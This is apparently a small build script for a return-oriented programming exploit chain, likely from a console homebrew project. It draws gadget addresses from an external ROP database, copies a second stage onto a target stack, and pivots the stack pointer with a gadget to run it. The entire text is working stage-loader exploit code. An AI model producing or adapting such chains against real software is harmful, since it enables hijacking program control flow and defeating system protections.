include("../ropdb/DB.py")
from constants import *
include("macros.py")

set_mem_offset(ROP_LOADER_PTR)

put_label("start")

memcpy(STACK_DEST, stage0, end-stage0)
add_word(SVC_EXITTHREAD)

put_label("stage0")

pop(r0=ROP_LOADER_PTR+end-start, r1=NOP)
add_word(MOV_SPR0_MOV_R0R2_MOV_LRR3_BX_R1)

put_label("end")
